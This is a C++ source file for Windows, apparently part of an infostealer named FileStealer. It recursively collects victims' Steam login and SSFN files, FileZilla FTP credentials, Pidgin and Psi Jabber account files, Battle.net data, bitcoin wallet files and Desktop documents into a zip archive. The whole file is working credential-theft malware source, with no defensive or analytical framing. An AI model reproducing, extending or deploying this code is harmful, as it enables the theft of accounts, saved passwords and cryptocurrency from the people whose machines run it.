#include <Windows.h>
#include <Shlwapi.h>
#include "FileStealer.h"
#include "DevApi.h"
#include "Zip.h"
#define FILE_ATTRIBUTES (FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM)

LONGLONG FileSize(const wchar_t* name)
{
	WIN32_FILE_ATTRIBUTE_DATA fad;
	if (!GetFileAttributesExW(name, GetFileExInfoStandard, &fad))
		return -1;
	LARGE_INTEGER size;
	size.HighPart = fad.nFileSizeHigh;
	size.LowPart = fad.nFileSizeLow;
	return size.QuadPart;
}

BOOL pathExists(LPCWSTR path, BOOL isFile) {
	if (isFile) {
		DWORD dwAttrib = GetFileAttributesW(path);

		return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
			!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
	}
	else {
		DWORD attribs = ::GetFileAttributesW(path);
		if (attribs == INVALID_FILE_ATTRIBUTES) {
			return false;
		}
		return (attribs & FILE_ATTRIBUTE_DIRECTORY);
	}
}

void fileStealerSteam(HZIP hZip, PCWCHAR path, DWORD* dwCount)
{
	if (WCHAR *strDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR)))
	{
		WIN32_FIND_DATAW fd;
		wnsprintfW(strDir, MAX_PATH, L"%s\\*", path);
		HANDLE hIter = FindFirstFileW(strDir, &fd);
		if (hIter != INVALID_HANDLE_VALUE)
		{
			do
			{
				wnsprintfW(strDir, MAX_PATH, L"%s\\%s", path, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
				{
					fileStealerSteam(hZip, strDir, dwCount);
				}
				else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
				{
					WCHAR* fName = (WCHAR*)malloc(260 * sizeof(WCHAR));
					if (StrStrW(fd.cFileName, L"loginusers.vdf")) {
						wnsprintfW(fName, 260, L"GAME.Steam\\loginusers.vdf");
						ZipAdd(hZip, fName, strDir);
						*dwCount = 1;
					}
					else if (StrStrW(fd.cFileName, L"config.vdf")) {
						wnsprintfW(fName, 260, L"GAME.Steam\\config.vdf");
						ZipAdd(hZip, fName, strDir);
						*dwCount = 1;
					}
					else if (StrStrW(fd.cFileName, L"ssfn")) {
						wnsprintfW(fName, 260, L"GAME.Steam\\%s", fd.cFileName);
						ZipAdd(hZip, fName, strDir);
						*dwCount = 1;
					}
					free(fName);
				}
			} while (FindNextFileW(hIter, &fd));
			FindClose(hIter);
		}
		free(strDir);
	}
}

void fileStealerFileZilla(HZIP hZip, PCWCHAR path, DWORD* dwCount)
{
	if (WCHAR *strDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR)))
	{
		WIN32_FIND_DATAW fd;
		wnsprintfW(strDir, MAX_PATH, L"%s\\*", path);
		HANDLE hIter = FindFirstFileW(strDir, &fd);
		if (hIter != INVALID_HANDLE_VALUE)
		{
			do
			{
				wnsprintfW(strDir, MAX_PATH, L"%s\\%s", path, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
				{
					fileStealerFileZilla(hZip, strDir, dwCount);
				}
				else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
				{
					WCHAR* fName = (WCHAR*)malloc(260 * sizeof(WCHAR));

					wnsprintfW(fName, 260, L"FTP.FileZilla\\%s", fd.cFileName);
					ZipAdd(hZip, fName, strDir);
					*dwCount = 1;

					free(fName);
				}
			} while (FindNextFileW(hIter, &fd));
			FindClose(hIter);
		}
		free(strDir);
	}
}

#define FILEGRABBER_MAX_FILES 30
void fileStealerGrabber(HZIP hZip, PCWCHAR path, DWORD* dwCount)
{
	static int grabberFiles;

	if (WCHAR *strDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR)))
	{
		WIN32_FIND_DATAW fd;
		wnsprintfW(strDir, MAX_PATH, L"%s\\*", path);
		HANDLE hIter = FindFirstFileW(strDir, &fd);
		if (hIter != INVALID_HANDLE_VALUE)
		{
			do
			{
				wnsprintfW(strDir, MAX_PATH, L"%s\\%s", path, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
				{
					fileStealerGrabber(hZip, strDir, dwCount);
				}
				else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
				{
					if (FILEGRABBER_MAX_FILES <= grabberFiles) goto eof;

					WCHAR* fName = (WCHAR*)malloc(260 * sizeof(WCHAR));
					if (StrStrW(fd.cFileName, L".doc") || StrStrW(fd.cFileName, L".txt") || StrStrW(fd.cFileName, L".rtf")) {
						if (FileSize(strDir) < (1024 * 1024 * 2)) {
							wnsprintfW(fName, 260, L"GRABBER.Files\\%s", fd.cFileName);
							ZipAdd(hZip, fName, strDir);
							*dwCount = 1;
							++grabberFiles;
						}
					}
					free(fName);
				}
			} while (FindNextFileW(hIter, &fd));
			eof:
			FindClose(hIter);
		}
		free(strDir);
	}
}

void fileStealerMass(HZIP hZip, PCWCHAR path, DWORD* dwCount)
{
	if (WCHAR *strDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR)))
	{
		WIN32_FIND_DATAW fd;
		wnsprintfW(strDir, MAX_PATH, L"%s\\*", path);
		HANDLE hIter = FindFirstFileW(strDir, &fd);
		if (hIter != INVALID_HANDLE_VALUE)
		{
			do
			{
				wnsprintfW(strDir, MAX_PATH, L"%s\\%s", path, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
				{
					fileStealerMass(hZip, strDir, dwCount);
				}
				else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
				{
					WCHAR* fName = (WCHAR*)malloc(260 * sizeof(WCHAR));
					
					if (StrStrW(fd.cFileName, L"config") || StrStrW(fd.cFileName, L".db")) {
						wnsprintfW(fName, 260, L"GAME.BattleNet\\%s", fd.cFileName);
						ZipAdd(hZip, fName, strDir);
						*dwCount = 1;
					} 
					else if (StrStrW(fd.cFileName, L"wallet") || StrStrW(fd.cFileName, L"bither") || StrStrW(fd.cFileName, L"bitcoin")) {
						wnsprintfW(fName, 260, L"BTC.Wallet\\%s", fd.cFileName);
						ZipAdd(hZip, fName, strDir);
						*dwCount = 1;
					}

					free(fName);
				}
			} while (FindNextFileW(hIter, &fd));
			FindClose(hIter);
		}
		free(strDir);
	}
}

void doJabber(HZIP hZip, DWORD* dwCount) {
	LPCWSTR appdata = getEnvW(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\.purple\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"PIDGIN.Jabber\\pidgin.txt", appdata);
		*dwCount = 1;
	}
	free((void*)appdata);

	appdata = getEnvW(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Psi\\profiles\\default\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"PSI.Jabber\\psi.txt", appdata);
		*dwCount = 1;
	}
	free((void*)appdata);

	appdata = getEnvW(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Psi+\\profiles\\default\\accounts.xml");

	if (pathExists(appdata, TRUE)) {
		ZipAdd(hZip, L"PSI+.Jabber\\psi+.txt", appdata);
		*dwCount = 1;
	}
	free((void*)appdata);
}

void doSteam(HZIP hZip, DWORD* dwCount) {
	HKEY key = NULL;
	LSTATUS os = RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Valve\\Steam", &key);
	if (os == ERROR_SUCCESS && key != NULL)
	{
		WCHAR value[MAX_PATH];
		DWORD value_length = MAX_PATH;
		DWORD tpe = REG_SZ;
		LSTATUS qs = RegQueryValueExW(key, L"InstallPath", NULL, &tpe, (LPBYTE)&value, &value_length);
		if (qs == ERROR_SUCCESS) {
			if (pathExists(value, FALSE))
				fileStealerSteam((HZIP)hZip, value, dwCount);
		}
	}
}

void doFilezilla(HZIP hZip, DWORD* dwCount) {
	LPCWSTR appdata = getEnvW(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\FileZilla");

	if (pathExists(appdata, FALSE))
		fileStealerFileZilla(hZip, appdata, dwCount);

	free((void*)appdata);
}

void doWallet(HZIP hZip, DWORD* dwCount) {
	LPCWSTR appdata = getEnvW(L"APPDATA");
	fileStealerMass(hZip, appdata, dwCount);
	free((void*)appdata);
}

void doSomeFiles(HZIP hZip, DWORD* dwCount) {
	LPCWSTR userprofile = getEnvW(L"USERPROFILE");
	lstrcatW((WCHAR*)userprofile, L"\\Desktop");

	fileStealerGrabber(hZip, userprofile, dwCount);
	free((void*)userprofile);
}

void doBattleNet(HZIP hZip, DWORD* dwCount) {
	LPCWSTR appdata = getEnvW(L"APPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Battle.net");

	if (pathExists(appdata, FALSE)) {
		fileStealerMass((HZIP)hZip, appdata, dwCount);
	}
	free((void*)appdata);

	appdata = getEnvW(L"LOCALAPPDATA");
	lstrcatW((WCHAR*)appdata, L"\\Battle.net");

	if (pathExists(appdata, FALSE)) {
		fileStealerMass((HZIP)hZip, appdata, dwCount);
	}
	free((void*)appdata);
}